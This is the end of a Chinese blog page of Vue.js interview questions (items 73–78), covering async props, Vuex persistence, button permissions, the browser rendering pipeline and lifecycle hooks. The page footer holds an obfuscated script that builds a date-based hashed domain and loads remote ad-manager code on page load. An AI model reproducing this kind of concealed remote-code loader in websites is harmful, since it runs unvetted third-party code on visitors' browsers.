<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">然后在模版中直接使用即可。</span></span></p> 
<h2 id="73.%E7%88%B6%E7%BB%84%E4%BB%B6%E5%BC%82%E6%AD%A5%E8%8E%B7%E5%8F%96%E5%8A%A8%E6%80%81%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6(%E5%A5%BD%E9%A2%98)" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">73.父组件异步获取动态数据传递给子组件(好题)</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24"><span style="background-color:#fff5e6">问题：</span></span><span style="color:#333333"><span style="background-color:#fefcd8">由于父组件中的数据是异步获取的，而子组件在一开始便会渲染，所以会造成子组件渲染完成后，数据还未获取到的情况</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24"><strong><span style="background-color:#fefcd8">解决方案</span></strong></span><span style="background-color:#f8f8f8"><span style="color:#333333">：</span></span><span style="color:#333333"><span style="background-color:#edf6e8">在子组件渲染前，判断父组件数据是否获取完成，数据获取完成后再渲染子组件.</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#edf6e8">//tab-weekly(v-if="userId", :userId="userId")</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">//tab-weekly是子组件，userId是在父组件中异步获取、需要传递给子组件tab-weekly的数据，在其中加一个判断，//当userId存在后，再渲染子组件</span></span></p> 
<h2 id="74.%E7%88%B6%E7%BB%84%E4%BB%B6%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6props%E4%BC%A0%E5%8F%82%EF%BC%8C%E5%AD%90%E7%BB%84%E4%BB%B6%E6%8E%A5%E6%94%B6%E7%9A%846%E7%A7%8D%E6%96%B9%E6%B3%95" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">74.父组件给子组件props传参，子组件接收的6种方法</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">1. data中  变量  = this.props里面的数据</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">2. watch监听  赋值</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">3. mounted  渲染完成后调用一个函数 进行赋值</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">4. vuex</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">5. computed 计算属性，用法和watch类似，computed是同步，watch可以异步</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">6. 父组件v-if 触发渲染和销毁，子组件触发传参</span></span></p> 
<h2 id="75.Vuex%E9%A1%B5%E9%9D%A2%E5%88%B7%E6%96%B0%E6%95%B0%E6%8D%AE%E4%B8%A2%E5%A4%B1%E5%92%8B%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AAbug" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">75.Vuex页面刷新数据丢失咋解决这个bug</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">问题：F5页面刷新，页面销毁之前的资源，重新请求，因此写在生命周期里的vuex数据是重新初始化，无法获取的，这也就是为什么会打印出空的原因。</span></span></p> 
<h3 id="%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF1%EF%BC%9A" style="margin-left:.0001pt;text-align:left">
<span style="color:#956fe7"><span style="background-color:#f8f8f8">解决思路1</span></span><span style="color:#38d8f0"><span style="background-color:#f8f8f8">：</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">使用Localstorage sessionStorage 或cookie</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">实际使用时当vuex值变化时，F5刷新页面，vuex数据重置为初始状态，所以还是要用到localStorage, </span></span></p> 
<h3 id="%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%952%3A" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">解决方法2:</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">插件vuex-persistedstate</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vuex-persistedstate默认持久化所有state，可以指定需要持久化的state</span></span></p> 
<h2 id="76.%E6%8C%89%E9%92%AE%E6%9D%83%E9%99%90%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">76.按钮权限怎么做？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fff5e6"> 在点击左侧菜单，存储全部权限，每次点击单个时候，去计算获取当前页面的按钮权限，封装一个button组件，然后在需要的地方引用</span></span></p> 
<h2 id="77.%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AF%B4%E4%B8%8B%E4%BB%8Eurl%E8%A7%A3%E6%9E%90%E5%88%B0%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%BF%87%E7%A8%8B%EF%BC%8C%E7%BB%93%E5%90%88%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%AF%B4" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">77.完整的说下从url解析到显示页面过程，结合项目中说</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">1. 首先浏览器主进程接管，开了一个下载线程。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">2. 然后进行HTTP请求（DNS查询、IP寻址等等），中间会有三次捂手，等待响应，开始下载响应报文。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">3. 将下载完的内容转交给Renderer进程管理。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">4. Renderer进程开始解析css rule tree和dom tree，这两个过程是并行的，所以一般我会把link标签放在页面顶部。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">5. 解析绘制过程中，当浏览器遇到link标签或者script、img等标签，浏览器会去下载这些内容，遇到时候缓存的使用缓存，不适用缓存的重新下载资源。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">6. css rule tree和dom tree生成完了之后，开始合成render tree，这个时候浏览器会进行layout，开始计算每一个节点的位置，然后进行绘制。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">7. 绘制结束后，关闭TCP连接，过程有四次挥手</span></span></p> 
<h2 id="78.vue%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E9%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%AD%E4%BD%BF%E7%94%A8%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">78.vue声明周期都在哪些场景中使用？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fbd4d0">1.beforeCreate(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　</span></span><span style="color:#333333"><span style="background-color:#fefcd8">创建前，访问不到data当中的属性以及methods当中的属性和方法，可以在当前生命周期创建一个loading，在页面加载完成之后将loading移除</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fbd4d0">2.created(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">　　</span><span style="background-color:#956fe7">创建后</span><span style="background-color:#fefcd8">，</span><span style="background-color:#e7fafa">当前生命周期执行的时候会遍历data中所有的属性</span><span style="background-color:#fefcd8">，给每一个属性都添加一个getter、setter方法,将data中的属性变成一个响应式属性</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fbd4d0">3. beforeMount(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#edf6e8">模板与数据</span><span style="background-color:#e7fafa">进行结合，但是还没有挂载到页面上。因此我们可以在当前生命周期中进行数据最后的修改</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#edf6e8">4.mounted(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　</span></span><span style="color:#333333"><span style="background-color:#fefcd8">　当前生命周期数据和模板进行相结合，并且已经挂载到页面上了，因此我们可以在当前生命周期中获取到真实的DOM元素</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fef2f0">5. beforeUpdate(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　</span></span><span style="color:#333333"><span style="background-color:#fefcd8">当数据发生改变的时候当前生命周期就会执行，因此我们可以通过当前生命周期来检测数据的变化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">　　当前生命周期执行的时候会将更新的数据与模板进行相结合，但是并没有挂载到页面上，因此我们可以在当前生命周期中做更新数据的最后修改</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fef2f0">6.updated(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">　　数据与模板进行相结合，并且将更新后的数据挂载到了页面上。因此我们可以在当前生命周期中获取到最新的DOM结构</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fef2f0">7. beforeDestroy(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　</span></span><span style="color:#333333"><span style="background-color:#fefcd8">当前生命周期中我们需要做事件的解绑  监听的移除  定时器的清除等操作</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fbd4d0">8. destroyed(){}</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">　　当前生命周期执行完毕后会将vue与页面之间的关联进行断开</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">当&lt;keep-alive&gt;包裹动态组件的时候会触发两个新的生命周期</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">9. </span></span><span style="color:#333333"><span style="background-color:#fef2f0">activated   </span></span><span style="background-color:#f8f8f8"><span style="color:#333333"> </span></span><span style="color:#333333"><span style="background-color:#f9eda6"> 当组件为活跃状态的时候触发(活跃状态：进入页面的时候)</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">10.</span></span><span style="color:#333333"><span style="background-color:#fbd4d0">  deactivated  </span></span><span style="background-color:#f8f8f8"><span style="color:#333333"> </span></span><span style="color:#333333"><span style="background-color:#fefcd8">  缓存状态的时候触发</span></span></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>